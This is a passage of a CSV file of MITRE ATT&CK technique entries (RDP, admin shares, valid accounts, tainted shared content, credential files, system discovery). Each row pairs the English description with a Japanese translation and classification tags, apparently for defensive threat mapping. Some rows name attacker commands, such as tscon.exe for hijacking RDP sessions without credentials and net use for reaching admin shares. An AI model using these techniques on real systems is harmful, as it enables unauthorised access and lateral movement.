T1076,,Remote Desktop Protocol,リモートデスクトッププロトコル,"Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). (Citation: TechNet Remote Desktop Services) There are other implementations and third-party tools that provide graphical access [Remote Services](https://attack.mitre.org/techniques/T1021) similar to RDS. Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use Credential Access techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility Features](https://attack.mitre.org/techniques/T1015) technique for Persistence. (Citation: Alperovitch Malware) Adversaries may also perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session and prompted with a question. With System permissions and using Terminal Services Console, <code>c:\windows\system32\tscon.exe [session number to be stolen]</code>, an adversary can hijack a session without the need for credentials or prompts to the user. (Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions. (Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in RedSnarf. (Citation: Kali Redsnarf)",リモートデスクトップはオペレーティングシステムに共通する機能である。これによりユーザーは、リモートシステム上のシステムデスクトップグラフィカルユーザーインターフェースで対話型セッションにログインできる。Microsoftは自社のリモートデスクトッププロトコル（RDP）実装をリモートデスクトップサービス（RDS）と呼称する。 （引用元：TechNet Remote Desktop Services）RDSと同様のグラフィカルアクセスを提供する他の実装やサードパーティ製ツールも存在する[Remote Services](https://attack.mitre.org/techniques/T1021)。サービスが有効化され、既知の認証情報を持つアカウントへのアクセスが許可されている場合、攻撃者はRDP/RDS経由でリモートシステムに接続し、アクセス権を拡大する可能性がある。 攻撃者は、RDPで使用する認証情報を取得するために、認証情報アクセス手法を使用する可能性が高いです。また、持続性確保のために、[アクセシビリティ機能](https://attack.mitre.org/techniques/T1015)手法と組み合わせてRDPを使用する場合もあります。 (出典: Alperovitch Malware) 攻撃者は正当なユーザーのリモートセッションを盗むRDPセッションハイジャックを実行する可能性もある。通常、セッション奪取の試行時にはユーザーに通知と確認プロンプトが表示される。 システム権限を持ち、ターミナルサービスコンソール（`c:\windows\system32\tscon.exe [奪取対象セッション番号]`）を使用すれば、攻撃者は認証情報やユーザーへの確認なしにセッションをハイジャックできます。（引用元: RDP Hijacking Korznikov）これはリモート/ローカル環境、アクティブ/切断済みセッションを問わず実行可能です。 (出典: RDPハイジャック Medium) ドメイン管理者以上の特権アカウントセッションを盗むことで、[リモートシステム発見](https://attack.mitre.org/techniques/T1018)や権限昇格にも繋がる。これら全てはWindowsネイティブコマンドで実行可能だが、RedSnarfの機能としても実装されている。(出典: Kali Redsnarf),lateral-movement,Windows,credential_abuse,boundary_crossing,authentication_system;privileged_account;user_interaction;endpoint_execution;network_connectivity;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0008,attack-pattern--51dea151-0898-4a45-967c-3ebee0420484,2017-05-31T21:30:59.769Z,2025-04-25T15:15:32.038Z,,,,
T1077,,Windows Admin Shares,Windows管理者共有,"Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include <code>C$</code>, <code>ADMIN$</code>, and <code>IPC$</code>. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over server message block (SMB) (Citation: Wikipedia SMB) to interact with systems using remote procedure calls (RPCs), (Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1035), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1075) and certain configuration and patch levels. (Citation: Microsoft Admin Shares) The [Net](https://attack.mitre.org/software/S0039) utility can be used to connect to Windows admin shares on remote systems using <code>net use</code> commands with valid credentials. (Citation: Technet Net Use)",Windowsシステムには、管理者だけがアクセス可能な隠しネットワーク共有が存在し、リモートファイルコピーやその他の管理機能を提供します。 例として<code>C$</code>、<code>ADMIN$</code>、<code>IPC$</code>などのネットワーク共有が挙げられる。攻撃者は管理者レベルの[有効なアカウント](https://attack.mitre.org/techniques/T1078)と組み合わせてこの手法を用い、サーバーメッセージブロック(SMB) (出典: Wikipedia SMB)を介してネットワークシステムにリモートアクセスし、リモートプロシージャコール(RPC) (出典: TechNet RPC)を使用してシステムと対話したり、ファイルを転送したり、転送されたバイナリをリモート実行したりする可能性があります。SMB/RPC経由の認証済みセッションに依存する実行手法の例としては、[スケジュールされたタスク/ジョブ](https://attack.mitre.org/techniques/T1053)、 [サービス実行](https://attack.mitre.org/techniques/T1035)、および[Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)である。 攻撃者はNTLMハッシュを悪用し、特定の構成やパッチレベルを持つシステムにおいて[Pass the Hash](https://attack.mitre.org/techniques/T1075)手法で管理者共有にアクセスすることも可能です。 (引用元: Microsoft Admin Shares) [Net](https://attack.mitre.org/software/S0039) ユーティリティは、有効な認証情報を使用した<code>net use</code>コマンドにより、リモートシステムのWindows管理者共有に接続するために使用できます。(引用元: Technet Net Use),lateral-movement,Windows,credential_abuse,boundary_crossing,authentication_system;privileged_account;endpoint_execution;network_connectivity;file_storage_access,specified,AD / Directory Server;Business Workstation;File Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0008,attack-pattern--ffe742ed-9100-4686-9e00-c331da544787,2017-05-31T21:31:00.200Z,2025-04-25T15:16:26.092Z,,,,
T1078,,Valid Accounts,有効なアカウント,"Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence. In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare) The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",攻撃者は、初期アクセス、持続性、特権昇格、防御回避の手段として、既存アカウントの認証情報を取得し悪用する可能性があります。 侵害された認証情報は、ネットワーク内のシステム上の様々なリソースに設定されたアクセス制御を迂回するために使用される可能性があり、VPN、Outlook Web Access、ネットワークデバイス、リモートデスクトップなどのリモートシステムや外部から利用可能なサービスへの持続的なアクセスにも使用される可能性があります。(引用元: volexity_0day_sophos_FW) 侵害された認証情報は、攻撃者に特定のシステムに対する昇格された権限や、ネットワークの制限区域へのアクセス権を付与する可能性もあります。 攻撃者は、正当なアクセス権限を提供する資格情報とマルウェアやツールを併用せず、自身の存在を検知されにくくする選択をする場合があります。場合によっては、攻撃者は非アクティブなアカウント（例：組織を離れた個人のアカウント）を悪用することがあります。これらのアカウントを使用することで、元のアカウント所有者が異常な活動を検知できないため、攻撃者は検知を回避できる可能性があります。(引用元: CISA MFA PrintNightmare) ネットワーク内のシステム間でローカルアカウント、ドメインアカウント、クラウドアカウントの権限が重複していることは懸念事項である。攻撃者はアカウントやシステムを横断して移動し、企業内で設定されたアクセス制御を迂回して高レベルのアクセス権限（ドメイン管理者や企業管理者など）を取得できる可能性があるためである。(引用元: TechNet Credential Theft),defense-evasion;persistence;privilege-escalation;initial-access,Windows;SaaS;IaaS;Linux;macOS;Containers;Network Devices;Office Suite;Identity Provider;ESXi,credential_abuse,privilege_gain,authentication_system;mfa_in_use;privileged_account;user_interaction;network_connectivity;cloud_control_plane,specified,Business Workstation;Identity / SaaS (IdP/SSO);Management Console for GovCloud;Network Device (FW/Proxy/AP);Proxy / Gateway;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2;S3;S1,S1,C02;C03;C01,Secondary Action;Secondary Intrusion;Initial Access,C01,Initial Access,TA0005;TA0003;TA0004;TA0001,attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81,2017-05-31T21:31:00.645Z,2025-04-15T19:58:58.373Z,,,,
T1078.001,T1078,Default Accounts,デフォルトアカウント,"Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS, the root user account in ESXi, and the default service account in Kubernetes.(Citation: Microsoft Local Accounts Feb 2019)(Citation: AWS Root User)(Citation: Threat Matrix for Kubernetes) Default accounts are not limited to client machines; rather, they also include accounts that are preset for equipment such as network devices and computer applications, whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module) Default accounts may be created on a system after initial setup by connecting or integrating it with another application. For example, when an ESXi server is connected to a vCenter server, a default privileged account called `vpxuser` is created on the ESXi server. If a threat actor is able to compromise this account’s credentials (for example, via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212) on the vCenter host), they will then have access to the ESXi server.(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)(Citation: Pentera vCenter Information Disclosure)",攻撃者は、初期アクセス、持続性確保、権限昇格、防御回避の手段として、デフォルトアカウントの認証情報を取得・悪用する可能性があります。デフォルトアカウントとは、Windowsシステムのゲストアカウントや管理者アカウントなど、OSに組み込まれたアカウントを指します。 デフォルトアカウントには、AWSのrootユーザーアカウント、ESXiのrootユーザーアカウント、Kubernetesのデフォルトサービスアカウントなど、他のシステム・ソフトウェア・デバイスにおける工場出荷時/プロバイダー設定のアカウントも含まれる。（引用元：Microsoft Local Accounts Feb 2019）（引用元：AWS Root User）(引用元: Threat Matrix for Kubernetes) デフォルトアカウントはクライアントマシンに限定されず、ネットワーク機器やコンピュータアプリケーション（内部開発品、オープンソース、商用製品を問わず）にプリセットされたアカウントも含まれます。ユーザー名とパスワードの組み合わせがプリセットされたアプライアンスは、インストール後に変更しない組織にとって深刻な脅威となります。攻撃者にとって容易な標的となるためです。 同様に、攻撃者は公開された、または盗まれた[秘密鍵](https://attack.mitre.org/techniques/T1552/004)や認証情報を悪用し、[リモートサービス](https://attack.mitre.org/techniques/T1021)を介して正当な接続を装い遠隔環境に侵入する可能性もある。(引用元: Metasploit SSH Module) デフォルトアカウントは、初期設定後にシステムを別のアプリケーションと接続または統合することで作成される場合があります。例えば、ESXiサーバーがvCenterサーバーに接続されると、ESXiサーバー上に`vpxuser`というデフォルトの特権アカウントが作成されます。 脅威アクターがこのアカウントの認証情報を侵害した場合（例：vCenterホストに対する[認証情報取得のためのエクスプロイト](https://attack.mitre.org/techniques/T1212)）、ESXiサーバーへのアクセス権を取得します。(引用元: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)(引用元: Pentera vCenter Information Disclosure),defense-evasion;persistence;privilege-escalation;initial-access,Windows;SaaS;IaaS;Linux;macOS;Containers;Network Devices;Office Suite;Identity Provider;ESXi,credential_abuse,privilege_gain,authentication_system;privileged_account;user_interaction;network_connectivity;cloud_control_plane,specified,Business Workstation;Identity / SaaS (IdP/SSO);Management Console for GovCloud;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3;S1,S1,C02;C03;C01,Secondary Action;Secondary Intrusion;Initial Access,C01,Initial Access,TA0005;TA0003;TA0004;TA0001,attack-pattern--6151cbea-819b-455a-9fa6-99a1cc58797d,2020-03-13T20:15:31.974Z,2025-04-15T19:58:35.610Z,,,,
T1078.002,T1078,Domain Accounts,ドメインアカウント,"Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.(Citation: TechNet Credential Theft) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.(Citation: Microsoft AD Accounts) Adversaries may compromise domain accounts, some with a high level of privileges, through various means such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or password reuse, allowing access to privileged resources of the domain.",攻撃者は、初期アクセス、持続性確保、権限昇格、防御回避の手段として、ドメインアカウントの認証情報を取得・悪用する可能性があります。(引用: TechNet Credential Theft) ドメインアカウントとは、Active Directory ドメインサービスによって管理され、そのドメインに属するシステムやサービス全体でアクセス権と権限が設定されているアカウントです。 ドメインアカウントは、ユーザー、管理者、サービスを対象とする。(引用: Microsoft AD Accounts)攻撃者は、[OS 認証情報ダンプ](https://attack.mitre.org/techniques/T1003) やパスワードの再利用など様々な手段を通じて、ドメインアカウント（一部は高い特権を持つもの）を侵害し、ドメインの特権リソースへのアクセスを可能にする可能性がある。,defense-evasion;persistence;privilege-escalation;initial-access,Linux;macOS;Windows;ESXi,credential_abuse,privilege_gain,authentication_system;privileged_account;user_interaction,specified,AD / Directory Server;Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3;S1,S1,C02;C03;C01,Secondary Action;Secondary Intrusion;Initial Access,C01,Initial Access,TA0005;TA0003;TA0004;TA0001,attack-pattern--c3d4bdd9-2cfe-4a80-9d0c-07a29ecdce8f,2020-03-13T20:21:54.758Z,2025-04-16T20:37:20.358Z,,,,
T1078.003,T1078,Local Accounts,ローカルアカウント,"Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. Local Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.",攻撃者は、初期アクセス、持続性確保、権限昇格、防御回避の手段として、ローカルアカウントの認証情報を取得・悪用する可能性があります。ローカルアカウントとは、組織が単一システムまたはサービス上でユーザー、リモートサポート、サービス、または管理目的で使用するために設定したアカウントです。 ローカルアカウントは、[OS認証情報ダンプ](https://attack.mitre.org/techniques/T1003)を通じて特権昇格や認証情報の収集に悪用される可能性もある。パスワードの再利用により、ネットワーク上の複数マシンでローカルアカウントが悪用され、特権昇格や横方向移動が行われる恐れがある。,defense-evasion;persistence;privilege-escalation;initial-access,Linux;macOS;Windows;Containers;Network Devices;ESXi,credential_abuse,privilege_gain,authentication_system;user_interaction;network_connectivity,specified,Business Workstation;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3;S1,S1,C02;C03;C01,Secondary Action;Secondary Intrusion;Initial Access,C01,Initial Access,TA0005;TA0003;TA0004;TA0001,attack-pattern--fdc47f44-dd32-4b99-af5f-209f556f63c2,2020-03-13T20:26:46.695Z,2025-04-15T19:59:24.607Z,,,,
T1078.004,T1078,Cloud Accounts,クラウドアカウント,"Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory.(Citation: AWS Identity Federation)(Citation: Google Federating GC)(Citation: Microsoft Deploying AD Federation) Service or user accounts may be targeted by adversaries through [Brute Force](https://attack.mitre.org/techniques/T1110), [Phishing](https://attack.mitre.org/techniques/T1566), or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto [Remote Services](https://attack.mitre.org/techniques/T1021). High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based [Software Deployment Tools](https://attack.mitre.org/techniques/T1072) to run commands on hybrid-joined devices. An adversary may create long lasting [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. Cloud accounts may also be able to assume [Temporary Elevated Cloud Access](https://attack.mitre.org/techniques/T1548/005) or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through [Cloud API](https://attack.mitre.org/techniques/T1059/009) or other methods. For example, in Azure environments, adversaries may target Azure Managed Identities, which allow associated Azure resources to request access tokens. By compromising a resource with an attached Managed Identity, such as an Azure VM, adversaries may be able to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s to move laterally across the cloud environment.(Citation: SpecterOps Managed Identity 2022)",クラウド環境における有効なアカウントは、攻撃者が初期アクセス、持続性確保、権限昇格、防御回避を達成するための行動を実行することを可能にする可能性があります。クラウドアカウントとは、組織がクラウドサービスプロバイダーまたはSaaSアプリケーション内のリソース管理、ユーザー利用、リモートサポート、サービス提供のために作成・設定したアカウントを指します。 クラウドアカウントはクラウド内にのみ存在する場合もあれば、Windows Active Directoryなどの他のIDソースとの同期やフェデレーションを通じて、オンプレミスシステムとクラウド間でハイブリッド結合される場合もあります。（引用元：AWS Identity Federation）（引用元：Google Federating GC）（引用元：Microsoft Deploying AD Federation）サービスアカウントやユーザーアカウントは、環境へのアクセスを得るために、[ブルートフォース攻撃](https://attack.mitre.org/techniques/T1110)、[フィッシング攻撃](https://attack.mitre.org/techniques/T1566)、その他様々な手段を通じて攻撃者の標的となる可能性があります。 フェデレーションまたは同期されたアカウントは、共有された認証情報を悪用して[リモートサービス](https://attack.mitre.org/techniques/T1021)にログインするなど、攻撃者がオンプレミスシステムとクラウド環境の両方に影響を与える経路となる可能性があります。 フェデレーション、同期、クラウド専用を問わず、高権限のクラウドアカウントは、SaaSベースの[ソフトウェア展開ツール](https://attack.mitre.org/techniques/T1072)を活用してハイブリッド接続デバイス上でコマンドを実行することで、オンプレミス環境へのピボットを可能にする可能性があります。 攻撃者は侵害されたクラウドアカウントに永続的な[追加クラウド認証情報](https://attack.mitre.org/techniques/T1098/001)を作成し、環境内での持続性を維持する可能性があります。こうした認証情報は多要素認証などのセキュリティ制御を迂回するためにも利用され得ます。 クラウドアカウントは、環境内の様々な手段を通じて[一時的な昇格クラウドアクセス](https://attack.mitre.org/techniques/T1548/005)やその他の特権を取得できる場合もあります。ロール割り当てやロール取得ポリシーの設定ミスにより、攻撃者がこれらのメカニズムを利用してアカウントの意図された権限範囲外で権限を行使できる可能性があります。 このような過剰な権限を持つアカウントは、[クラウドAPI](https://attack.mitre.org/techniques/T1059/009)やその他の方法を通じて、オンラインストレージアカウントやデータベースから機密データを収集するために悪用される可能性があります。例えばAzure環境では、攻撃者は関連するAzureリソースがアクセストークンを要求することを可能にするAzureマネージドIDを標的とする可能性があります。 マネージドIDが紐付けられたリソース（Azure VMなど）を侵害することで、攻撃者は[アプリケーションアクセストークン窃取](https://attack.mitre.org/techniques/T1528)を行い、クラウド環境内で横方向に移動できる可能性があります。（引用元: SpecterOps Managed Identity 2022）,defense-evasion;persistence;privilege-escalation;initial-access,SaaS;IaaS;Office Suite;Identity Provider,credential_abuse,privilege_gain,authentication_system;mfa_in_use;identity_federation;privileged_account;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;saas_in_use;file_storage_access;database_access;logging_monitoring,specified,AD / Directory Server;Business Workstation;File Server;Identity / SaaS (IdP/SSO);Log / Monitoring Server;Management Console for GovCloud,subtechnique;has_created_ts;has_modified_ts,S2;S3;S1,S1,C02;C03;C01,Secondary Action;Secondary Intrusion;Initial Access,C01,Initial Access,TA0005;TA0003;TA0004;TA0001,attack-pattern--f232fa7a-025c-4d43-abc7-318e81a73d65,2020-03-13T20:36:57.378Z,2025-04-15T19:59:20.556Z,,,,
T1079,,Multilayer Encryption,多層暗号化,"An adversary performs C2 communications using multiple layers of encryption, typically (but not exclusively) tunneling a custom encryption scheme within a protocol encryption scheme such as HTTPS or SMTPS.",攻撃者は、複数の暗号化層を使用して C2 通信を実行します。通常（ただし、これに限定されない）、HTTPS や SMTPS などのプロトコル暗号化スキーム内で、カスタム暗号化スキームをトンネリングします。,command-and-control,Linux;macOS;Windows,destructive_impact,remote_control,email_infrastructure,specified,Business Workstation;Mail / Collaboration;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--428ca9f8-0e33-442a-be87-f869cb4cf73e,2017-05-31T21:31:01.315Z,2025-04-25T15:15:26.824Z,,,,
T1080,,Taint Shared Content,共有コンテンツの汚染,"Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally. A directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses [Shortcut Modification](https://attack.mitre.org/techniques/T1547/009) of directory .LNK files that use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like the real directories, which are hidden through [Hidden Files and Directories](https://attack.mitre.org/techniques/T1564/001). The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. (Citation: Retwin Directory Share Pivot) Adversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.",攻撃者は、ネットワークドライブや内部コードリポジトリなどの共有ストレージ場所にコンテンツを追加することで、リモートシステムにペイロードを配信する可能性がある。ネットワークドライブやその他の共有場所に保存されたコンテンツは、本来有効なファイルに悪意のあるプログラム、スクリプト、またはエクスプロイトコードを追加することで汚染される可能性がある。ユーザーが汚染された共有コンテンツを開くと、悪意のある部分が実行され、リモートシステム上で攻撃者のコードが実行される。攻撃者は汚染された共有コンテンツを利用して横方向の移動を行う可能性がある。 ディレクトリ共有ピボットは、ユーザーが共有ネットワークディレクトリにアクセスした際にマルウェアを拡散させるために、他の複数の手法を組み合わせたこの技術の変種です。これはディレクトリの[ショートカット改変](https://attack.mitre.org/techniques/T1547/009)を利用します。[偽装](https://attack.mitre.org/techniques/T1036)により正規ディレクトリに見せかけたLNKファイルを使用し、これらは[隠しファイルとディレクトリ](https://attack.mitre.org/techniques/T1564/001)によって非表示にされている。 悪意のある.LNKベースのディレクトリには、ディレクトリ内の隠されたマルウェアファイルを実行し、その後本来の目的のディレクトリを開く埋め込みコマンドが含まれています。これにより、ユーザーの期待する操作が依然として実行されます。頻繁に使用されるネットワークディレクトリで使用された場合、この手法は頻繁な再感染やシステムへの広範なアクセス、さらには新規かつより高い特権を持つアカウントへのアクセスを招く可能性があります。 (引用: Retwin Directory Share Pivot)攻撃者はまた、共有ネットワークディレクトリ上の健全なバイナリに自身のコードを追加または前置することで、バイナリ感染を通じて共有ネットワークディレクトリを侵害する可能性があります。マルウェアは、正当なコードよりも先に実行されるよう、健全なバイナリの元のエントリポイント(OEP)を変更する場合があります。 感染は、新たに感染したファイルがリモートシステムで実行される際に拡散を継続する可能性があります。これらの感染は、.EXE、.DLL、.SCR、.BAT、および/または.VBSを含む（これらに限定されない）拡張子で終わるバイナリ形式と非バイナリ形式の両方を標的とする可能性があります。,lateral-movement,Windows;SaaS;Linux;macOS;Office Suite,script_command_execution,boundary_crossing,privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;File Server;Identity / SaaS (IdP/SSO);Management Console for GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0008,attack-pattern--246fd3c7-f5e3-466d-8787-4c13d9e3b61c,2017-05-31T21:31:01.759Z,2025-04-15T19:58:14.334Z,,,,
T1081,,Credentials in Files,ファイル内の認証情報,"Adversaries may search local file systems and remote file shares for files containing passwords. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords. It is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: CG 2014) Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller. (Citation: SRD GPP) In cloud environments, authenticated user credentials are often stored in local configuration and credential files. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files. (Citation: Specter Ops - Cloud Credential Storage)",攻撃者は、ローカルファイルシステムやリモートファイル共有をスキャンし、パスワードを含むファイルを検索する可能性があります。これには、ユーザーが自身の認証情報を保存するために作成したファイル、グループで共有される認証情報ストア、システムやサービスのパスワードを含む設定ファイル、埋め込まれたパスワードを含むソースコード/バイナリファイルなどが含まれます。 [OS認証情報ダンプ](https://attack.mitre.org/techniques/T1003)により、バックアップや保存された仮想マシンからパスワードを抽出することが可能です。（引用元：CG 2014）また、Windowsドメインコントローラーに保存されたグループポリシー設定からもパスワードを取得できる場合があります。 (引用: SRD GPP) クラウド環境では、認証済みユーザーの認証情報がローカル設定ファイルや認証情報ファイルに保存されることが多い。場合によっては、これらのファイルを別のマシンにコピーして再利用したり、内容を直接読み取ってファイルをコピーせずに認証に使用したりできる。(引用: Specter Ops - Cloud Credential Storage),credential-access,Windows;IaaS;Linux;macOS,credential_abuse,credential_gain,authentication_system;user_interaction;endpoint_management;network_connectivity;cloud_control_plane;file_storage_access,specified,AD / Directory Server;Backup Server;Business Workstation;File Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--ba8e391f-14b5-496f-81f2-2d5ecd646c1c,2017-05-31T21:31:02.188Z,2025-04-25T15:16:03.360Z,,,,
T1082,,System Information Discovery,システム情報の発見,"An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. Tools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather detailed system information (e.g. <code>show version</code>).(Citation: US-CERT-TA18-106A) On ESXi servers, threat actors may gather system information from various esxcli utilities, such as `system hostname get`, `system version get`, and `storage filesystem list` (to list storage volumes).(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(Citation: Varonis) Infrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API) [System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques)",攻撃者は、バージョン、パッチ、ホットフィックス、サービスパック、アーキテクチャなど、オペレーティングシステムとハードウェアに関する詳細情報を取得しようとする可能性があります。攻撃者は、自動化された情報収集中に[システム情報発見](https://attack.mitre.org/techniques/T1082)から得た情報を活用し、ターゲットへの完全な感染の可否や特定のアクションの試行を含む、その後の行動を決定します。 [Systeminfo](https://attack.mitre.org/software/S0096) などのツールを使用して詳細なシステム情報を収集できます。 特権アクセスで実行している場合、macOSの<code>systemsetup</code>設定ツールを通じてシステムデータの詳細を収集できます。例として、ユーザーレベルアクセス権を持つ攻撃者は<code>df -aH</code>コマンドを実行し、現在マウントされているディスクと関連する空き容量を取得できます。 攻撃者はネットワーク機器上の[ネットワークデバイスCLI](https://attack.mitre.org/techniques/T1059/008)を活用し、詳細なシステム情報（例：<code>show version</code>）を収集する可能性もあります。(引用元: US-CERT-TA18-106A) ESXiサーバーでは、脅威アクターが`system hostname get`、`system version get`、`storage filesystem list`（ストレージボリューム一覧表示）などのesxcliユーティリティからシステム情報を収集する可能性があります。(引用元: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(引用元: Varonis) AWS、GCP、AzureなどのIaaSクラウドプロバイダーは、API経由でインスタンスや仮想マシンの情報へのアクセスを許可しています。認証されたAPI呼び出しが成功すると、特定のインスタンスのOSプラットフォームやステータス、仮想マシンのモデルビューなどのデータが返される可能性があります。(引用元: Amazon Describe Instance)(引用元: Google Instances 